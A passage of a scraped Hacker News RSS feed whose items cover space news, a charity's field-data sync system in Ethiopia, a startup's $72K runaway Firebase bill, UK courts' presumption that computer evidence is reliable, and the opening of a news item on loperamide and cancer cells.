mission (<a href="http://www.unoosa.org/documents/pdf/copuos/2018/copuos2018tech19E.pdf" target="_blank">pdf</a>), and maybe a mission to Jupiter... on top of their <a href="https://en.wikipedia.org/wiki/Chinese_large_modular_space_station" target="_blank">crewed orbital station that starts assembly next year</a>.</p></div><!--[if mso]> <![endif]--> <!--[if mso]></table><![endif]--></div><div> <!--[if mso]><table align="left" border="0" cellspacing="0" cellpadding="0" width="100%" style="width:100%;"><tr> <![endif]--> <!--[if mso]><td valign="top" width="600" style="width:600px;"> <![endif]--><div><p><a href="#news-in-brief">¶</a><strong id="news-in-brief">News in brief. </strong>China <a href="https://spacenews.com/china-launches-first-long-march-8-from-wenchang-spaceport" target="_blank">launched its new Long March 8 vehicle on its maiden flight</a> carrying 5 satellites—the LM-8 has a throttleable RP-1/LOX first stage that is intended to eventually be reusable; <a href="https://www.cnbc.com/2020/12/21/lockheed-martins-aerojet-rocketdyne-deal-helps-compete-with-spacex.html" target="_blank">Lockheed is buying Aerojet Rocketdyne</a> in a cash deal valued at 4.4B, meaning Lockheed will now build both Orion and the SLS’s engines; <a href="https://spacenews.com/rocket-lab-launches-japanese-radar-imaging-satellite/" target="_blank">Rocket Lab launched a Japanese radar imaging satellite</a>; OneWeb is back in business and <a href="https://twitter.com/OneWeb/status/1339995449051275269" target="_blank">launched 36 more Internet satellites</a>—they will require $1 billion more in investment to complete their 650 satellite constellation in 2022; <a href="https://spacenews.com/nasa-postpones-review-of-near-earth-asteroid-detection-mission/" target="_blank">NASA postponed review of its proposed planetary defense Near Earth Object (NEO) Surveyor asteroid mapping mission</a>&nbsp;due to budget uncertainty; <a href="https://www.isro.gov.in/pslv-c50-cms-01/launch-of-pslv-c50-cms-01-mission" target="_blank">India launched its CMS-01 communication satellite</a>; <a href="https://spacenews.com/spacex-wraps-up-2020-with-falcon-9-launch-of-classified-nro-satellite/" target="_blank">SpaceX launched their 26th and last mission of 2020</a>— a classified NRO satellite— and stuck their 70th recovery; <a href="https://www.capellaspace.com/capella-unveils-worlds-highest-resolution-commercial-sar-imagery/" target="_blank">Capella Space released 50 cm resolution SAR images</a> (which <a href="https://www.capellaspace.com/no-sar-cant-see-through-buildings/" target="_blank">cannot see through buildings</a>); <a href="https://spacenews.com/amazon-unveils-flat-panel-customer-terminal-for-kuiper-constellation/" target="_blank">Amazon unveiled their flat-panel Kuiper constellation terminals</a>—the relatively small phased array antenna has the transmit and receive elements layered to decrease size and cost; <a href="https://www.spacecom.mil/News/Article-Display/Article/2448334/russia-tests-direct-ascent-anti-satellite-missile/" target="_blank">Russia, unfortunately, tested another kinetic direct ascent ASAT weapon</a> (<a href="https://www.masswerk.at/spacewar/" target="_blank">this</a> is the only spacewar we want to see anytime soon); and, in the same vein, the US Navy has sailors, the US Army has soldiers, and apparently the US Space Force has ‘<a href="https://www.npr.org/2020/12/19/948375055/space-force-members-will-be-called-guardians" target="_blank">guardians</a>’. ☄️🤺😬</p></div><!--[if mso]> <![endif]--> <!--[if mso]></table><![endif]--></div><div> <!--[if mso]><table align="left" border="0" cellspacing="0" cellpadding="0" width="100%" style="width:100%;"><tr> <![endif]--> <!--[if mso]><td valign="top" width="600" style="width:600px;"> <![endif]--><div><p><a href="#etc">¶</a><strong id="etc">Etc.</strong></p><ul><li>A good year-end <a href="https://www.nasaspaceflight.com/2020/12/starship-sn9-roll-launch-site-super-heavy-ramps-up/" target="_blank">wrap-up of current Starship and Super Heavy development status</a>. (Related: <a href="https://twitter.com/SpacePadreIsle/status/1341447736437202945?s=20" target="_blank">SN9 has already rolled out to the launch site</a>.)</li><li>A new study from the Japanese Ishigakijima Astronomical Observatory <a href="https://www.nao.ac.jp/en/news/science/2020/20201208-ishigakijima.html" target="_blank">has found that dark coatings, like those used by the Starlink ‘darksat’, can decrease satellite visibility by half</a>. Given this finding, it is interesting that SpaceX has preferred the use of visors to dark coatings. There has been conjecture that ‘darksat’ has a harder time managing thermals since its darker surfaces absorb more solar radiation.&nbsp;</li><li>It wasn’t just Apollo 13. Scott Manley <a href="https://www.youtube.com/watch?v=xvltG-i6AS0" target="_blank">reviews all the times systems have been jury-rigged in space</a>.</li><li> <a href="https://www.youtube.com/watch?v=7pSqk-XV2QM" target="_blank">How Kodak Exposed The Atomic Bomb</a>, the story of oddly-exposed Kodak X-Ray film and how they used it to detect the Trinity nuclear bomb test.</li><li> <a href="https://ares.jsc.nasa.gov/astromaterials3d/" target="_blank">Explore NASA’s virtual library of space rocks in 3D</a>, or <a href="https://www.virtualmicroscope.org/collections/apollo" target="_blank">under a microscope</a>.</li><li><a href="https://www.lawfareblog.com/artemis-accords-step-toward-international-cooperation-or-further-competition" target="_blank">Artemis Accords: A Step Toward International Cooperation or Further Competition?</a></li><li>A <a href="https://history.nasa.gov/wakeup%20calls.pdf" target="_blank">chronology (pdf)</a> of every wakeup call received by astronauts from Mission Control, covering 46 years from Gemini 6 through the last Space Shuttle missions, and even including “wake up” music played at the start of each day for the Mars Spirit and Opportunity team. STS-80 started their first day with “I Can See For Miles” and their last, Dec 6, 1996, to “Please Come Home For Christmas”.</li></ul></div><!--[if mso]> <![endif]--> <!--[if mso]></table><![endif]--></div></td></tr><tr></tr></tbody></table><!--[if (gte mso 9)|(IE)]></table><![endif]--> </center></div></article></div></div>]]>
            </description>
            <link>http://orbitalindex.com/archive/2020-12-23-Issue-96/#the-square-kilometer-array</link>
            <guid isPermaLink="false">hacker-news-small-sites-25519366</guid>
            <pubDate>Wed, 23 Dec 2020 16:38:05 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Serving hundreds of families in Africa better with software]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25519343">thread link</a>) | @acwatt
<br/>
December 23, 2020 | https://alexcwatt.com/hello-africa-ethiopia-act/ | <a href="https://web.archive.org/web/*/https://alexcwatt.com/hello-africa-ethiopia-act/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p><img src="https://alexcwatt.com/assets/2020/12/ethiopia-act-data.png" alt=""></p>

<p>In January 2020, I spent a week in Ethiopia with a team of medical professionals from <a href="https://www.cityreformed.org/" target="_blank">my church</a> and a sister church in Boston. It was an amazing week, and the environment was quite different from my “normal” in the States. On the return trip, as the plane was descending into Pittsburgh, I was shocked to see residential neighborhoods with large, beautiful houses, after a week of houses being very small and made of corrugated metal.</p>

<p>Anyway, our team was there to run a clinic. I had been told I might be able to work on a tech project, but had pretty low expectations. This post is about how that did, in fact, materialize.</p>



<h2 id="background">Background</h2>

<p><img src="https://alexcwatt.com/assets/2020/12/ethiopia-act-logo.png" alt="Ethiopia ACT logo"></p>

<p><a href="https://ethiopiaact.org/" target="_blank">Ethiopia ACT</a> serves the sick and poor in <a href="https://www.google.com/maps/place/Addis+Ababa,+Ethiopia/" target="_blank">Addis Ababa</a>. It was started in 2002, at the height of the HIV crisis. Today their ministry still helps with HIV/AIDS, but has expanded to include other social care as well: For instance, they have met the financial needs of hundreds of families and have helped hundreds of families become self-sufficient. When I met the founder, Andy Warren, I was impressed by the data-driven decision-making approach he champions. He told me that <em>measurable impact</em> is one of their ministry values.</p>

<p>Because data is so important to their ministry, Ethiopia ACT runs a database server in their main office with records for families. One of their staff members, Danny, does most of the database administration, and he had asked our team to work with him to enable social workers to collect data in the field with donated Android phones and sync that data to the database. Previously the social workers were using paper forms. So Bill, a Pittsburgh colleague, and I got to work thinking about how to make this possible.</p>

<p>The initial vision was simple enough: Capture the patient ID, a couple metrics related to HIV/AIDS, and the date. As I understood the problem domain better and sketched a solution, I suggested other changes to their data model to get more value from the work we were doing. I convinced Danny that in addition to tracking HIV metrics over time, we could get even more value by having a table of visits. Working together, we came up with the following additional fields:</p>

<ul>
  <li>Date of visit</li>
  <li>Social worker</li>
  <li>Location (both latitude and longitude, and <a href="https://en.wikipedia.org/wiki/What3words" target="_blank">What3Words</a> address)</li>
  <li>Follow-up actions required</li>
  <li>Notes on the visit</li>
</ul>

<p>Since then, the project has expanded to capture additional data, but this illustrates some of the work in improving the data model.</p>

<p>One key detail I didn’t realize on my first day, that became apparent throughout the week: Supporting offline use would be critical. The electric and Internet infrastructure in Ethiopia is extremely unreliable, so a good solution would need to not only allow data to be collected offline, but also support the database server being offline frequently.</p>

<h2 id="about-the-tech">About the Tech</h2>

<p>Ethiopia ACT uses <a href="https://en.wikipedia.org/wiki/FileMaker" target="_blank">FileMaker</a> to run its database. Bill and I were unfamiliar with it, and briefly considered other options, as I wondered if we could find something open source that would be more robust and easier to integrate, but the ease of maintaining FileMaker by their staff and of creating UI’s to manipulate the data would be hard to replicate. We decided to leave it.</p>

<p>Ethiopia ACT also uses <a href="https://www.fulcrumapp.com/" target="_blank">Fulcrum</a> to gather data from the field. With Fulcrum, anyone can make a survey form, and push it to mobile devices. The app works great offline and can sync data to Fulcrum’s servers when it comes back online. This worked great for some projects, but for the data they track in FileMaker, there was no obvious way to connect the two systems.</p>

<h2 id="exploring-the-how">Exploring the “How”</h2>

<p>After a couple days of investigating, we not only decided to stick with FileMaker, but also decided that Fulcrum was probably the best option (or a good-enough option) for the mobile data collection. I did spend a hot minute tinkering with <a href="https://expo.io/" target="_blank">Expo</a>, but that wouldn’t have supported easy maintenance. (Frontend friends: If you think running <code>npm install</code> is awful over high-speed Internet, you should really try it in Africa sometime. 😃)</p>

<p>Thus the high-level plan became:</p>
<ul>
  <li>Use Fulcrum’s <a href="https://docs.fulcrumapp.com/docs/webhooks" target="_blank">webhooks</a> feature to watch for form submissions</li>
  <li>Use FileMaker’s <a href="https://fmhelp.filemaker.com/docs/18/en/dataapi/" target="_blank">REST API</a> to add the data</li>
</ul>

<p>With that plan, we decided to try integrating with FileMaker first: There were more moving pieces with that – authentication, pushing to multiple tables, figuring out how to even enable the API (we had to upgrade FileMaker to get support for it), etc.</p>

<p>For the FileMaker integration, I looked at two libraries primarily: <a href="https://github.com/davidhamann/python-fmrest" target="_blank">fmrest</a> (Python) and <a href="https://github.com/Luidog/fms-api-client" target="_blank">fms-api-client</a> (JavaScript). Although I’m better at Python, the JavaScript package was much better documented, so I decided to go with it. It took a few tries to understand the API, but overall a proof-of-concept of pushing dummy data into the server was pretty simple.</p>

<h2 id="final-architecture">Final Architecture</h2>

<p>Here’s the data flow we landed on:</p>

<ul>
  <li>Data is collected in a Fulcrum form.</li>
  <li>Once the data is submitted, it triggers a webhook that pushes the data to a Google Cloud Function.</li>
  <li>The Google Cloud Function transforms the data and saves it in Firestore. Running this Cloud Function would be basically free, but we decided to also integrate with <a href="https://developer.what3words.com/" target="_blank">What3Words</a> to take the latitude and longitude of the form submission and look up the “address” of the beneficiary.<sup id="fnref:1" role="doc-noteref"><a href="#fn:1">1</a></sup> So the Cloud Function uses <a href="https://cloud.google.com/vpc/docs/configure-serverless-vpc-access" target="_blank">VPC access</a> to talk to the What3Words API.</li>
  <li>A script is run on the database server to pull data from Firestore and push it into Fulcrum. It processes one document at a time, and pushes the data into FileMaker, deleting documents as they are successfully processed.</li>
</ul>

<h3 id="tech-stack-summary">Tech Stack Summary:</h3>

<ul>
  <li>Google Cloud Platform: Google Cloud Function, Firebase, and Serverless VPC.</li>
  <li>Languages and Frameworks: Node.js for both the Google Cloud Function and the database server script, with Jest for unit testing, and fms-api-client to talk to FileMaker.</li>
</ul>

<h2 id="battle-scars">Battle Scars</h2>

<p>Every tech project has at least a few foibles. Some of the ones we encountered:</p>

<ul>
  <li>FileMaker doesn’t have a programmatic way to manage migrations. Migrations are literally just someone changing the columns through a UI. Between some cleanup I wanted to do (spelling standardization, for instance) and the changes needed for the project, we had quite a list, and no simple way to test it all, although we could (and did) make copies of the database file. Shout-out to Bill for managing this part of the project! 🙏</li>
  <li>I thought it might be a good idea to try running a reverse SSH proxy from the database server to a cloud server, and let the Fulcrum webhook push data directly through to the database server. I wanted to try it because it would have made the overall integration easier, but it proved infeasible with the Internet reliability issues, and I also knew it would be better to have a data queue in the cloud that we could pull from when we were online.</li>
  <li>Setting up CI/CD – the Cloud Function deploys, the test runners, it all takes a few tries – but that’s normal.</li>
</ul>

<blockquote><div lang="en" dir="ltr"><p>Setting up Bitbucket CI/CD for a side project, as seen by commit history:</p><p>- Start on Pipeline<br>- Continue working on deploy strategy [skip ci]<br>- Overhaul Pipeline build<br>- Fix pipeline<br>- Enable Docker for second step</p><p>... and it's probably not over yet.</p></div>— Alex Watt (@acwatt) <a href="https://twitter.com/acwatt/status/1341063091170230272?ref_src=twsrc%5Etfw">December 21, 2020</a></blockquote>


<h2 id="some-wins">Some Wins</h2>

<ul>
  <li><a href="https://docs.gitlab.com/ee/ci/" target="_blank">GitLab CI/CD</a>: Having nearly 100% test coverage, and an automated test and deployment pipeline, was a big win overall. Danny has been able to make changes to the code with greater confidence, and has been able to write tests for new features modeled on the existing tests.</li>
  <li><a href="https://code.visualstudio.com/learn/collaboration/live-share" target="_blank">VS Code’s Live Share</a> is fantastic for collaboration. The audio quality was better than WhatsApp, and once we got setup, Danny and I were able to pair program like we were sitting next to each other, despite being 7000 miles apart.</li>
  <li>Google Cloud’s Firestore is a simple document database, and the <a href="https://www.npmjs.com/package/@google-cloud/firestore" target="_blank">Node SDK</a> is a breeze. I was glad for the <a href="https://firebase.google.com/docs/firestore/manage-data/transactions" target="_blank">transaction support</a> because as part of the data modeling, I decided to have the incoming Fulcrum records split into multiple documents in Firestore – basically one per object. I wanted to write all of these documents together, or none at all, and transactions enabled that.</li>
</ul>

<h2 id="summary">Summary</h2>

<p>What I thought would be a small project actually became a pretty mature software project. I needed some additional time after getting back to polish it, and since then Danny has also wanted to extend it to handle more fields. I’ve been mostly hands-off for this – I review his code, and we’ve had lots of conversations about programming, version control, testing, etc., but he has been the one making the changes.</p>

<p>As I think about the impact, I am really excited that Ethiopia ACT can use this project to better serve hundreds of families in Addis Ababa. It’s also been very exciting to see the skills Danny has developed from continuing on this project (e.g., Git, VS Code, Node.js, etc.) and to get to continue to work with him, including our occasional early morning calls over the past year (early morning in Pittsburgh is afternoon in Africa).</p>

<p>Danny also told me that this project has made the field workers more connected with the administrators and managers, which was encouraging to hear. I look forward to seeing how the Lord uses this in 2021 and beyond!</p>

<hr>

<p>In the long tradition of writing a “Hello World!” program to learn a new language, I decided to title this post about writing a program in (and for) Africa, “Hello Africa!”</p>





</div><p>Posted on 23 Dec 2020.</p><p>Please note: I reserve the right to delete comments that are off-topic or offensive.</p></div>]]>
            </description>
            <link>https://alexcwatt.com/hello-africa-ethiopia-act/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25519343</guid>
            <pubDate>Wed, 23 Dec 2020 16:35:59 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[We Burnt $72K testing Firebase and almost went bankrupt]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25519302">thread link</a>) | @wheresvic4
<br/>
December 23, 2020 | https://blog.tomilkieway.com/72k-2/ | <a href="https://web.archive.org/web/*/https://blog.tomilkieway.com/72k-2/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>                
			<blockquote>
  <p>One Hundred Sixteen Billion: that’s the number of times our test code read Firestore database in less than an hour.</p>
</blockquote>

<p>This post is Part 2 in the series. If you haven’t already, go through <strong><a href="https://blog.tomilkieway.com/72k-1/">Part 1</a></strong> first so this one makes sense :)</p>

<h3 id="standing-himalaya-is-telling-us">Standing Himalaya is telling us…</h3>
<p>This was the first time that I had received such a big set back. It had the potential to alter the course of our company and my life. There were several lessons on entrepreneurship in this incident, one important one was to stay strong.</p>

<p>I had a team of ~7 engineers/interns at this time, and it would take Google about 10 days to get back to us on this incident. In the meantime we had to resume development, find our way around account suspensions. Despite this thought on my mind, we had to focus on the features and our product.</p>

<center>
<a href="https://blogs.transparent.com/hindi/poem-in-hindi-khada-himalaya-bata-raha-hai/" target="_blank">
<img src="https://blog.tomilkieway.com/assets/images/72K/khada-himalaya.jpg" width="80%"><br>
<em>Poem: Khada Himalaya bata raha hai (Standing Himalaya is telling us)
</em></a>
</center>

<p>For some reason one poem from my childhood kept playing in my head. It was my favorite one, and I remembered it word to word, even though the last time I recited it was over 15 years ago.</p>

<h3 id="what-did-we-actually-do">What did we actually do?</h3>
<p>As a very small team, we wanted to stay serverless for as long as we could. The problem with serverless solutions like Cloud Functions and Cloud Run was timeout.</p>

<p>One instance at any time would be serially scraping the URLs in a web page. But soon after 9 minutes, it would time out.</p>

<p>After discussing this problem, and powered with caffiene, within minutes I wrote some dry code on the white board which I now see had so many design issues, but back then, we were focused more on failing and learning super fast and trying new things.</p>

<center>
<img src="https://blog.tomilkieway.com/assets/images/72K/whiteboard.jpg" width="100%"><br>
<em>Announce-AI's 'Hello World' version on Cloud Run</em>
</center>

<p>To overcome the timeout limitation, I suggested using POST requests (with URL as data) to send jobs to an instance, and use multiple instances in parallel instead of using one instance serially. Because each instance in Cloud Run would only be scraping one page, it would never time out, process all pages in parallel (scale), and also be highly optimized because Cloud Run usage is accurate to milliseconds.</p>

<center>
<img src="https://blog.tomilkieway.com/assets/images/72K/flowchart.jpg" width="100%"><br>
<em>Scraper deployed on Cloud Run</em>
</center>

<p>If you look closely, the flow is missing few important pieces.</p>

<ol>
  <li>Exponential Recursion without Break: The instances wouldn’t know when to break, as there was no break statement.</li>
  <li>The POST requests could be of the same URLs. If there’s a back link to the previous page, the Cloud Run service will be stuck in infinite recursion, but what’s worst is, that this recursion is multiplying exponentially (our max instances were set to 1000!)</li>
</ol>

<p>As you can imagine, this lead to 1000 instances querying, and writing to Firebase DB every few milli seconds. Looking at the data post incident, we saw that the Firebase Reads were at one point about 1 Billion Requests per minute!</p>

<center>
<img src="https://blog.tomilkieway.com/assets/images/72K/transactions.jpg" width="100%"><br>
<em>End of month Transaction Summary for GCP Billing Account</em>
</center>

<h3 id="116-billion-reads-and-33-million-writes">116 Billion Reads and 33 Million Writes</h3>
<p>Running our this version of Hello World deployment on Cloud Run, made 116 Billion reads and 33 Million Writes to Firestore. Ouch!</p>

<p>Read Operations Cost on Firebase:</p>

<p><strong>$ (0.06 / 100,000) * 116,000,000,000 = $ 69,600</strong></p>

<h3 id="16000-hours-of-cloud-run-compute-time">16,000 hours of Cloud Run Compute time</h3>
<p>After testing, we assumed that the request died because logging stopped, but actually it went into background process. As we didn’t delete the services (this was our first time using Cloud Run, and we didn’t really understand it back then), multiple services continued to operate slowly.</p>

<p>In 24 hours, these service versions each scaled to 1000 instances consumed <strong>16,022 hours.</strong></p>

<h2 id="all-our-mistakes">All our Mistakes</h2>
<h4 id="deploying-flawed-algorithm-on-cloud">Deploying flawed algorithm on Cloud</h4>
<p>Already discussed above. We did discover a new way to use serverless using POST requests, something I hadn’t found anywhere on the internet, but deployed it without refining the algorithm.</p>

<h4 id="deploying-cloud-run-with-default-options">Deploying Cloud Run with Default Options</h4>
<p>While creating a Cloud Run service, we chose default values in the service. The max-instances is preset to 1000, and concurrency set to 80. In the beginning we didn’t know that these values are actually worst case scenario for a test program.</p>

<p>Had we chosen max-instances to be “2”, our costs would’ve been 500 times less. <strong>$72,000 bill would’ve been: $144</strong></p>

<p>Had we chosen concurrency of “1” request, we probably wouldn’t have even noticed the bill.</p>

<h4 id="using-firebase-without-understanding-it-completely">Using Firebase without understanding it completely</h4>
<p>There are somethings that can only be learnt after lot of experience. Firebase isn’t a language that one can learn, it’s a containerized platform service provided by Google. It has rules defined by them, not by laws of nature or how a particular user may think they are.</p>

<center>
<img src="https://blog.tomilkieway.com/assets/images/72K/firebase.png" width="60%">
</center>

<p>Also, while writing code in Node.js, one must take care of Background processes. If the code goes into background processes, there’s no easy way for the developer to know that the service is running, but it might be, for fairly long time. As we learnt later on, this was the reason why most of our Cloud Functions were timing out as well.</p>

<h4 id="fail-fast-learn-fast-with-cloud-is-a-bad-idea">Fail fast, learn fast with Cloud is a bad idea</h4>
<p>Cloud overall is like a double edged sword. When used properly, it can be of great use, but if used incorrectly, it can have consequences.</p>

<p>If you count the number of pages in GCP documentation, it’s probably more than pages in few novels. Understanding Pricing, Usage, is not only time consuming, but requires a deep understanding of how Cloud services work. No wonder there are full time jobs for just this purpose!</p>

<h4 id="firebase-and-cloud-run-are-really-powerful">Firebase, and Cloud Run are really powerful</h4>
<p>At the peak, Firebase was able to handle about one billion reads per minute. This is exceptionally powerful. We had been playing around with Firebase for 2-3 months now and still learning about it, but I had absolutely no idea how powerful it was until now.</p>

<p>Same goes with Cloud Run! With Concurrency == 60, max_containers == 1000 and each Request taking 400ms, number of requests Cloud Run can handle <strong>9 million requests per minute!</strong></p>

<h4 id="60--1000--25--60--9000000-requests--minute">60 * 1000 * 2.5 * 60 = 9,000,000 requests / minute</h4>

<p>For comparison, Google Search gets 3.8 million searches per minute.</p>

<h4 id="edit-use-cloud-monitoring">(EDIT): Use Cloud Monitoring</h4>
<p>While <a href="https://cloud.google.com/monitoring">Google Cloud Monitoring</a> doesn’t stop the billing, it does send timely alerts (lag of about 3-4 minutes). There’s a learning curve in understanding Google Cloud’s proto / naming structure, but once you spend time with it, the dashboards, alerts and metrics make the life a little easier.</p>

<p>These metrics are only availabe for 90 days, and we’ve lost the metrics from this incident (there was a huge bump in Firebase and Cloud Run usage for those days), otherwise I’d be happy to share them in this post.</p>

<h2 id="we-survived">We Survived</h2>
<center>
<img src="https://blog.tomilkieway.com/assets/images/72K/phew.gif" width="100%">
<em>Phew, that was close</em>
</center>

<p>After going through our lengthy doc on this incident sharing our side of the story, various consults, talks, and internal discussions Google let go of our bill as a one time gesture!</p>

<p><strong>Thank you Google!</strong></p>

<p>We got our lifeline, and got back on both our feet to build Announce. Except this time with a much better perspective, architecture, and much safer implementation.</p>

<blockquote>
  <p>Google, my favorite tech company, is not just a great company to work for. It’s also a great company to collaborate with. The tools provided by Google are very developer friendly, have a great documentation (for the most part), and are consistently expanding.</p>
</blockquote>

<p>(EDIT: these are my - the author’s personal opinions as an individual developer. Our company is in no way sponsored, or related with Google).</p>

<h2 id="what-next">What Next?</h2>
<p>After this incident, we spent few months on understanding Cloud and our architecture. In few weeks my understanding improved so much that I approximated the cost of scraping the “entire web” using Cloud Run with improved algorithm.</p>

<p>This incident led me to analyze our product’s architecture in depth, and we scrapped V1 of our product, to build scalable infrastructure to power our products.</p>

<p>In Announce V2, we didn’t just build an MVP; we built a platform where we could iteratively develop new products rapidly, and test them thoroughly in a safe environment.</p>

<p>This journey took us some time… <a href="https://annc.in/">Announce</a> was launched in November end, ~7 months later than we had decided for our V1, but it is highly scalable, gets the best of Cloud services, and is highly optimized for usage.</p>

<p>We also launched on all platforms, and not just web.</p>

<p>What’s more is that we reused the entire platform to build our second product <a href="https://pointaddress.com/">Point Address</a>. Not only are both the products scalable, have a great architecture, and highly efficient, they are built on a platform that allows us to rapidly build and deploy ideas into useable products.</p>

<hr>

<center>
<h4><a href="https://announce.today/" target="_blank">
<img src="https://blog.tomilkieway.com/assets/images/72K/anc.png" width="80%"><br>

Announce: Relevant information at the right place, at the right time</a></h4>
</center>

<hr>

<center>
<h4><a href="https://pointaddress.com/" target="_blank">
<img src="https://blog.tomilkieway.com/assets/images/72K/point.png" width="50%"><br>
Point Address: The world has a new address</a></h4>
</center>

<hr>

<p>I will soon be writing another post on how to deploy on GCP while keeping usage, development and cost in check.</p>
                
			</article></div>]]>
            </description>
            <link>https://blog.tomilkieway.com/72k-2/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25519302</guid>
            <pubDate>Wed, 23 Dec 2020 16:32:22 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[UK legal system assumes that computers don't have bugs]]>
            </title>
            <description>
<![CDATA[
Score 37 | Comments 23 (<a href="https://news.ycombinator.com/item?id=25518936">thread link</a>) | @idw
<br/>
December 23, 2020 | https://www.postofficetrial.com/2020/12/horizon-trial-judgment-could-force.html | <a href="https://web.archive.org/web/*/https://www.postofficetrial.com/2020/12/horizon-trial-judgment-could-force.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="post-body-8395381807871793881" itemprop="description articleBody">
<table><tbody><tr><td><a href="https://1.bp.blogspot.com/-4Une6thEnCY/X-DTZo-996I/AAAAAAAAPqE/5HSx1yemHtU7qJVfezdcp0WvEN7uEHZogCLcBGAsYHQ/s592/20201219%2BStephen%2BMason%2Bheadshot.jpg" imageanchor="1"><img data-original-height="592" data-original-width="394" height="320" src="https://1.bp.blogspot.com/-4Une6thEnCY/X-DTZo-996I/AAAAAAAAPqE/5HSx1yemHtU7qJVfezdcp0WvEN7uEHZogCLcBGAsYHQ/s320/20201219%2BStephen%2BMason%2Bheadshot.jpg"></a></td></tr><tr><td><span>Stephen Mason</span></td></tr></tbody></table><p>I have known the barrister Stephen Mason for nearly a decade. He specialises in the presentation of electronic evidence in court.&nbsp;</p><p>When the <a href="https://www.jfsa.org.uk/uploads/5/4/3/1/54312921/pol_interim_report_signed.pdf" target="_blank">Second Sight interim review</a> into the state of the Post Office's Horizon IT system was published in July 2013, I asked him straight up if it was possible that Horizon IT errors could be responsible for discrepancies in Subpostmaster accounts. His simple "<a href="http://becarefulwhatyouwishfornickwallis.blogspot.com/2013/08/post-office-2nd-sight-report-into.html" target="_blank">Yes, of course</a>" by way of response was unequivocal.</p><p>We stayed in touch. I read some of his work, including his <a href="http://becarefulwhatyouwishfornickwallis.blogspot.com/2015/11/barrister-criticises-post-office.html" target="_blank">clear view of where the court was wrong</a> in the prosecution of Seema Misra, the West Byfleet Postmaster sent to prison whilst pregnant.</p><p>Mr Mason's central argument is that a recommendation given by the Law Commission in 1997 to the courts is helplesssly, hopelessly and dangerously wrong. <a href="https://journals.sas.ac.uk/deeslr/article/view/5143/5027" target="_blank">The guidance states</a>:</p><blockquote>"in the absence of evidence to the contrary, the courts will presume that&nbsp;mechanical instruments were in order at the material time...&nbsp;<i>The principle has been applied to such devices as speedometers and traffic lights and in the consultation paper we saw no reason why it should not apply to computers.</i>" [my italics]</blockquote><p>You don't need to be a legal eagle or IT genius to see that the Law Commission's decision to leap from a speedometer to the vastly complex digital ecosystems underpinning modern computer networks is mutton-headed, to say the least.</p><p>Yet it is this presumption the courts have relied on throughout the 21st century in the prosecutions of Subpostmasters and unfortunate individuals in other spheres, who were, it turns out, entirely innocent.</p><p>Mr Mason has been attempting to get the legal position on computers changed for as long as I can remember. Now he has a document which might force the issue - the <a href="https://www.bailii.org/ew/cases/EWHC/QB/2019/3408.html" target="_blank">Horizon Issues judgment</a>, handed down on 16 Dec 2019.</p><p>On the anniversary of the judgment, Mr Mason, along with the barrister Paul Marshall and eight other learned authors, published a paper positing alternatives to the way digital evidence is currently handled in the courts.</p><p>It is called: "<a href="https://journals.sas.ac.uk/deeslr/article/view/5240/5083" target="_blank">Recommendations for the probity of computer evidence</a>" and it states:</p><blockquote>"All computers have a propensity to fail, possibly seriously. That is to say, they have a latent propensity to function incorrectly."</blockquote><p>As a general rule of thumb:</p><blockquote>"A program on a mobile telephone might hitherto have contained tens of thousands of lines of software code. A program such as Horizon will contain tens of millions of lines of code, and will be exceedingly complex. Programming is a human task and programmers make mistakes; an error rate in writing software code of 10 errors per thousand lines of code&nbsp;is considered good, 1 error per thousand lines is rarely if ever achieved."</blockquote><p>By way of example the paper cites a 2006 University of York review of a study conducted by the Ministry of Defence into the safety of the software contained in its Hercules C130J air transporters. The MoD found that the Hercules software contained about 1.4 safety-critical faults per thousand lines of code (kLoC) with an overall flaw density of around 23 per kLoC</p><p>The review notes:</p><blockquote>"whilst a fault density of 1 per kLoC may seem high it is worth noting that commercial software is around 30 faults per kLoC, with initial fault injection rates of over 100 per kLoC."</blockquote><p>Mr Mason et al's clear recommendations for a protocol on the way electronic evidence is treated by the legal system&nbsp;<a href="https://journals.sas.ac.uk/deeslr/article/view/5240/5083" target="_blank">can be read here</a>. They seem eminently sensible.</p><p>*****************</p><p>If you are able to give £20 or more you will be added to the secret email list. This alerts you to upcoming developments on this scandal before they are made public, as well as links to articles and stories posted here on this blog or elsewhere.</p>

</div></div>]]>
            </description>
            <link>https://www.postofficetrial.com/2020/12/horizon-trial-judgment-could-force.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-25518936</guid>
            <pubDate>Wed, 23 Dec 2020 15:59:59 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Anti-diarrhoea drug drives cancer cells to cell death]]>
            </title>
            <description>
<![CDATA[
Score 328 | Comments 98 (<a href="https://news.ycombinator.com/item?id=25518831">thread link</a>) | @gmays
<br/>
December 23, 2020 | https://aktuelles.uni-frankfurt.de/englisch/anti-diarrhoea-drug-drives-cancer-cells-to-cell-death/ | <a href="https://web.archive.org/web/*/https://aktuelles.uni-frankfurt.de/englisch/anti-diarrhoea-drug-drives-cancer-cells-to-cell-death/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="content" role="main">

				
<article id="post-48447">

	
	
	
<div><figure><img src="https://aktuelles.uni-frankfurt.de/wp-content/uploads/2020/12/beitragsbild_durchfallmittel-krebszellen.jpg" alt="" srcset="https://aktuelles.uni-frankfurt.de/wp-content/uploads/2020/12/beitragsbild_durchfallmittel-krebszellen.jpg 650w, https://aktuelles.uni-frankfurt.de/wp-content/uploads/2020/12/beitragsbild_durchfallmittel-krebszellen-300x208.jpg 300w" sizes="(max-width: 650px) 100vw, 650px"><figcaption><em>In glioblastoma cells, the antidiarrheal drug loperamide triggers the degradation of the endoplasmic reticulum. In the normal state, it is coloured yellow in these microscopic images. In the degradation state, it glows as a red signal (marked with arrows). Left scale bar: 20 µm, right scale bar (inset): 5 µm (Photos: Svenja Zielke et. al.)</em></figcaption></figure></div>



<p><strong>In cell culture,
